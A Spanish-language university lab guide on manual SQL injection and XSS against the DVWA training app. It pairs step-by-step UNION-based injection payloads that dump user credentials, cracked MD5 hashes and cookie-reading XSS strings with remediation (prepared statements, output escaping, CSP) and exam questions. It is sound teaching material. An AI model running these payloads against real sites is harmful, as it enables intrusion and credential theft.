# GUÍA DIDÁCTICA Y ACADÉMICA — LABORATORIO 2
## "Inyección SQL Manual (SQLi), Cross-Site Scripting (XSS) y Defensas Web"
### Asignatura: Seguridad Informática (GSR600)
### Plataforma de Referencia: DVWA (Damn Vulnerable Web Application)

---

## 1. INTRODUCCIÓN Y CONTEXTO

Este laboratorio reproduce y analiza las pruebas de penetración web contenidas en las secciones **6.3 (Inyección SQL)** y **6.4 (Ataques XSS)** de la guía oficial de la materia, abordando dos de las categorías más críticas del **OWASP Top 10**:

1. **A03:2021 — Injection (Inyección SQL):** Ocurre cuando datos no confiables son enviados al intérprete de la base de datos como parte de un comando o consulta sin previa validación o parametrización.
2. **Cross-Site Scripting (XSS):** Ocurre cuando una aplicación web incluye datos no saneados en una página web enviada al navegador, permitiendo la ejecución de código JavaScript en el contexto de la víctima.

---

## 2. PARTE PRÁCTICA 6.3: INYECCIÓN SQL MANUAL (PASO A PASO)

### 2.1. Detección de la Vulnerabilidad (La Comilla Simple `'`)
* **Acción:** Introducir una comilla simple (`'`) en el campo ID.
* **Consulta generada en el servidor:**
  ```sql
  SELECT first_name, last_name FROM users WHERE user_id = ''';
  ```
* **Efecto:** La tercera comilla rompe la delimitación de la cadena de texto en el motor MySQL, generando un error de sintaxis:
  `You have an error in your SQL syntax; check the manual...`
* **Conclusión del Auditor:** La aplicación es vulnerable porque los errores del motor son devueltos a la interfaz y el dato del usuario no fue sanitizado.

---

### 2.2. Determinación del Número de Columnas (`ORDER BY`)
Para construir un ataque basado en `UNION`, es requisito estricto que ambas consultas tengan **exactamente el mismo número de columnas**.
* `1' and 1=1 order by 1#` → **Éxito** (Existe al menos 1 columna).
* `1' and 1=1 order by 2#` → **Éxito** (Existen al menos 2 columnas).
* `1' and 1=1 order by 3#` → **Error en base de datos** (`Unknown column '3' in 'order clause'`).
* **Conclusión del Auditor:** La consulta original selecciona exactamente **2 columnas** (`first_name` y `last_name`). El carácter `#` se usa para comentar y anular el resto del código SQL original del servidor.

---

### 2.3. Extracción de Metadatos con `UNION SELECT`
Al saber que la consulta espera 2 columnas, se utiliza `1' and 1=0` (para que la primera consulta no retorne filas) y se inyectan funciones del sistema:
* **Versión del motor:**
  ```sql
  1' and 1=0 union select null, @@version #
  ```
* **Versión y Nombre de la Base de Datos:**
  ```sql
  1' and 1=0 union select @@version, database() #
  ```

---

### 2.4. Enumeración del Esquema con `information_schema`
MySQL posee una base de datos interna (`information_schema`) que cataloga todas las tablas y columnas:
* **Descubrir tablas:**
  ```sql
  1' and 1=0 union select null, group_concat(table_name) from information_schema.tables where table_schema=database() #
  ```
  *(Devuelve la lista de tablas, entre ellas la tabla `users`)*.
* **Descubrir columnas de la tabla `users`:**
  ```sql
  1' and 1=0 union select null, group_concat(column_name) from information_schema.columns where table_name='users' #
  ```
  *(Revela las columnas: `user_id`, `first_name`, `last_name`, `user`, `password`, etc.)*.

---

### 2.5. Exfiltración de Credenciales y Crackeo de Hashes
* **Sentencia final inyectada:**
  ```sql
  1' and 1=0 union select null, group_concat(user, 0x3a, password) from users #
  ```
  *(Nota técnica: `0x3a` es la representación hexadecimal del carácter dos puntos `:`, utilizado como separador entre usuario y clave).*
* **Resultado exfiltrado:**
  `admin:5f4dcc3b5aa765d61d8327deb882cf99, gordonb:e99a18c428cb38d5f260853678922e03, 1337:8d3533d75ae2c3966d7e0d4fcc69216b...`
* **Crackeo con Tablas Arcoíris:**
  Los hashes MD5 extraídos son revertidos en bases de datos precalculadas:
  * `admin` → `password`
  * `gordonb` → `abc123`
  * `1337` → `charley`
  * `pablo` → `letmein`
  * `smithy` → `password`

---

## 3. REMEDIACIÓN Y DEFENSA CONTRA INYECCIÓN SQL

La única solución definitiva contra la inyección SQL es el uso de **Sentencias Preparadas (Prepared Statements con PDO)**:

```php
// CÓDIGO SEGURO IMPLEMENTADO EN EL LABORATORIO:
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id");
$stmt->bindValue(':id', $id_input, PDO::PARAM_INT);
$stmt->execute();
$resultados = $stmt->fetchAll();
```

### ¿Por qué neutraliza el ataque?
Las sentencias preparadas separan la **fase de compilación de la consulta** de la **fase de envío de datos**. Cuando el atacante envía `1' OR 1=1#`, el motor de base de datos trata todo el texto como un simple valor literal de cadena, no como código ejecutable. Ninguna comilla puede alterar la lógica sintáctica de la consulta.

---

## 4. PARTE PRÁCTICA 6.4: ATAQUES XSS (CROSS-SITE SCRIPTING)

### 4.1. Vectores Evaluados en la Guía
1. **Ventana emergente (`alert()`):**
   `<script>alert("Ataque XSS")</script>`
   Demuestra la ejecución de código JavaScript en el navegador del cliente.
2. **Inserción de marcos (`<iframe>`):**
   Incrusta sitios web externos para engañar visualmente al usuario.
3. **Robo de Cookies (`document.cookie`):**
   `<script>alert(document.cookie)</script>`
   Permite al atacante leer la cookie de sesión (`session_token`) para secuestrar cuentas de usuario.
4. **Redirección no autorizada (`window.location`):**
   Envía al usuario a un sitio fraudulento de Phishing.
5. **Defacement (XSS-404):**
   Inyección de etiquetas HTML y estilos que alteran por completo la página original, mostrando un mensaje de sitio hackeado.

### 4.2. Remediación Defensiva contra XSS
* **Sanitización de salida con `htmlspecialchars()`:**
  ```php
  echo htmlspecialchars($nombre, ENT_QUOTES, 'UTF-8');
  ```
  Convierte los caracteres peligrosos (`<`, `>`, `"`, `'`) en entidades inocuas (`&lt;`, `&gt;`, `&quot;`).
* **Bandera `HttpOnly` en Cookies:**
  Impide que JavaScript pueda acceder a las cookies de autenticación vía `document.cookie`.
* **Content Security Policy (CSP):**
  Cabecera HTTP que prohíbe la ejecución de scripts no autorizados.

---

## 5. ATAQUES DE FUERZA BRUTA Y CONTRAMEDIDAS

* **Ataque por Diccionario:** Uso de listas masivas de palabras y contraseñas comunes (ej. `rockyou.txt`) mediante herramientas como Hydra o Burp Suite.
* **Contramedidas Implementadas:**
  1. **Límite de Intentos (Account Lockout):** Bloqueo tras 3 fallos consecutivos.
  2. **Rate Limiting (Retraso Temporal):** Enfriamiento obligatorio de 60 segundos tras el bloqueo.
  3. **MFA (Doble Factor):** Exige un código temporal para completar el acceso.
  4. **WAF:** Detección de patrones anómalos y bloqueo de la dirección IP de origen.

---

## 6. PREGUNTAS CLAVE PARA DEFENSA ANTE EL DOCENTE

**P1: ¿Por qué la sentencia `1' and 1=1 order by 3#` produce error en este laboratorio?**
* **R:** Porque la cláusula `ORDER BY` le indica al motor ordenar por el índice de columna especificado. Como la consulta original solo selecciona dos columnas (`first_name` y `last_name`), ordenar por la columna 3 genera un error de columna inexistente, lo que le permite al auditor deducir que la consulta tiene exactamente 2 columnas.

**P2: ¿Para qué sirve el operador `0x3a` en `group_concat(user, 0x3a, password)`?**
* **R:** `0x3a` es la codificación hexadecimal del carácter dos puntos (`:`). Se utiliza para concatenar de forma ordenada el nombre de usuario y su contraseña en un formato legible (`usuario:hash`), facilitando su posterior análisis y crackeo.

**P3: ¿Por qué `htmlspecialchars()` previene los ataques XSS?**
* **R:** Porque reemplaza los caracteres especiales de marcado HTML como `<` y `>` por sus entidades equivalentes `&lt;` y `&gt;`. De este modo, el navegador interpreta la entrada estrictamente como texto visual y nunca como etiquetas `<script>` ejecutables.

**P4: ¿Cómo previene una sentencia preparada con PDO la inyección SQL?**
* **R:** Porque compila de antemano el árbol sintáctico de la consulta SQL antes de recibir los valores. El dato inyectado se transmite por un canal separado como un parámetro tipado, impidiendo que caracteres como comillas o palabras clave como `UNION` sean interpretados como comandos del lenguaje SQL.
